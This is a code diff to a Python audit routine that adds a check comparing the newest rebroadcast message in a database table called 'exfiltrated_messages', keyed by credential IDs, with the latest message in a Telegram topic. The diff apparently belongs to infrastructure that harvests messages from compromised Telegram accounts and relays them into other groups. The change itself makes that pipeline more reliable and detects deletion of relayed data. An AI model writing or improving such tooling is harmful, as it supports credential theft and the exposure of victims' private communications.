@@ -102,7 +102,39 @@ async def _audit_active_topics_async():
                 await asyncio.sleep(5) # Backoff
             else:
                 logger.warning(f"    ⚠️ [Audit] Check failed for {cred_id} (Topic {topic_id}): {e}")
+                continue # Skip message check if topic check failed
+        
+        # Case C: Message Integrity Check (Double Validation)
+        # Check if latest DB message exists in Telegram Topic
+        try:
+            # Get latest broadcasted message for this credential
+            last_msg_db = db.table("exfiltrated_messages")\
+                .select("telegram_msg_id, id")\
+                .eq("credential_id", cred_id)\
+                .eq("is_broadcasted", True)\
+                .order("telegram_msg_id", desc=True)\
+                .limit(1)\
+                .execute()
+            
+            if last_msg_db.data:
+                db_msg_id = last_msg_db.data[0].get("telegram_msg_id")
                 
+                # Check real state via UserAgent
+                from app.services.user_agent_srv import user_agent
+                real_last_msg_id = await user_agent.get_last_message_id(group_id, topic_id)
+                
+                if real_last_msg_id:
+                    # If DB has messages but Topic is empty or way behind
+                    if real_last_msg_id < db_msg_id:
+                         logger.warning(f"    🚨 [Audit] Integrity mismatch for {cred_id}! DB says {db_msg_id}, Telegram says {real_last_msg_id}. Possible data loss or deletion.")
+                         # Optional: Trigger re-broadcast of missing messages?
+                         # For now, just log.
+                    else:
+                        # logger.info(f"    ✅ [Audit] Integrity OK for {cred_id}. (DB: {db_msg_id} <= TG: {real_last_msg_id})")
+                        pass
+        except Exception as e:
+            logger.error(f"    ⚠️ [Audit] Message integrity check failed: {e}")
+
     result_msg = f"🛡️ **Audit Finished**:\nChecked: {checked_count}\nMissing Topics: {missing_topic_count}\nRecovered (Deleted): {recovered_count}"
     logger.info(result_msg)
     await broadcaster.send_log(result_msg)
